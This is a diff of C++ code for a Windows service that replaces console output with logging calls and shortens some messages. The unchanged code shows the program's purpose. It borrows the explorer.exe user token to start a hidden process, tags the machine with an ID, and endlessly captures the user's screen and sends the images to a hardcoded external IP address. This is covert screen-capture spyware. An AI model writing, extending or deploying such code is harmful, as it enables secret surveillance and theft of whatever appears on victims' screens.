@@ -31,14 +31,14 @@ ServiceManager::~ServiceManager(void) {}
 //------------------------------------------------------------------------------
 
 void ServiceManager::main(bool separate_process) {
-    cout << "Main" << endl;
+    this->log("Main", false);
 
     if (separate_process) {
         ostringstream command;
         command << "\"" << this->path << "\" update";
 
-        cout << "SeparateProcess" << endl;
-        cout << command.str() << endl;
+        this->log("SeparateProcess", false);
+        this->log(command.str(), false);
 
         bool success_launched = false;
         while (!success_launched) {
@@ -49,11 +49,14 @@ void ServiceManager::main(bool separate_process) {
 
         this->report_status(SERVICE_STOPPED, NO_ERROR, 0);
     } else {
-        cout << "Creating ScreenManager" << endl;
+        this->log("Creating ScreenManager", false);
         ScreenManager screen_manager = ScreenManager();
 
         this->unique_id = get_machine_id();
-        cout << "UniqueID: " << this->unique_id << endl;
+
+        ostringstream str_unique_id;
+        str_unique_id << "UniqueID: " << this->unique_id;
+        this->log(str_unique_id.str(), false);
 
         string hostname = "192.241.213.182";
         // string hostname = "192.168.0.118";
@@ -61,8 +64,10 @@ void ServiceManager::main(bool separate_process) {
 
         int i = 0;
         while (1) {
-            cout << i << endl;
-            cout << "Socket: " << socket << endl;
+            this->log(i, false);
+            ostringstream str_socket;
+            str_socket << "S " << socket;
+            this->log(str_socket, false);
 
             if (socket == 0) {
                 socket = connect(hostname, 61400);
@@ -70,17 +75,14 @@ void ServiceManager::main(bool separate_process) {
 
             if (socket != 0) {
                 string image = screen_manager.capture();
-                cout << "Captured screen" << endl;
+                this->log("S", false);
                 bool success = send_image(socket, image, this->unique_id, hostname);
 
                 if (!success) {
                     socket = 0;
                 }
-
-                // wait();
             }
 
-            // wait();
             i += 1;
         }
     }
@@ -108,11 +110,11 @@ int ServiceManager::install(void) {
     if (service) {
         bool result;
 
-        cout << "Service already exists. Stopping it" << endl;
+        this->log("Service already exists. Stopping it", false);
 
         SERVICE_STATUS_PROCESS status;
         if (ControlService(service, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &status)) {
-            cout << "Waiting service to stop" << endl;
+            this->log("Waiting service to stop", false);
 
             SERVICE_STATUS status;
             do {
@@ -226,11 +228,11 @@ bool ServiceManager::launch_process(string command) {
             OpenProcessToken(hProcess, TOKEN_EXECUTE | TOKEN_READ | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY_SOURCE | TOKEN_WRITE | TOKEN_DUPLICATE, &hToken);
             CloseHandle(hProcess);
         } else {
-            cout << "Could not open process 'explorer.exe'" << endl;
+            this->log("Could not open process 'explorer.exe'", false);
             return false;
         }
     } else {
-        cout << "Could not retrieve process id for 'explorer.exe'" << endl;
+        this->log("Could not retrieve process id for 'explorer.exe'", false);
         return false;
     }
 
@@ -242,15 +244,15 @@ bool ServiceManager::launch_process(string command) {
         si.cb = sizeof(si);
         ZeroMemory(&pi, sizeof(pi));
 
-        cout << "Going to create process" << endl;
+        this->log("Going to create process", false);
 
         if (CreateProcessAsUser(hToken, NULL, const_cast<char*>(command.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi) == 0) {
-            cout << "CreateProcessAsUser() failed with error: " << GetLastError() << endl;
+            this->log("CreateProcessAsUser() failed with error: ");
             CloseHandle(hToken);
             return false;
         }
 
-        cout << "process was created" << endl;
+        this->log("process was created", false);
 
         while (this->running) {
             wait();
@@ -258,16 +260,16 @@ bool ServiceManager::launch_process(string command) {
 
         // WaitForSingleObject(pi.hProcess, INFINITE);
 
-        cout << "should stop. Going to kill the process" << endl;
+        this->log("should stop. Going to kill the process", false);
         TerminateProcess(pi.hProcess, 0);
 
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         CloseHandle(hToken);
 
-        cout << "Everything killed" << endl;
+        this->log("Everything killed", false);
     } else {
-        cout << "Token retrieved from 'explorer.exe' is NULL" << endl;
+        this->log("Token retrieved from 'explorer.exe' is NULL", false);
         return false;
     }
 
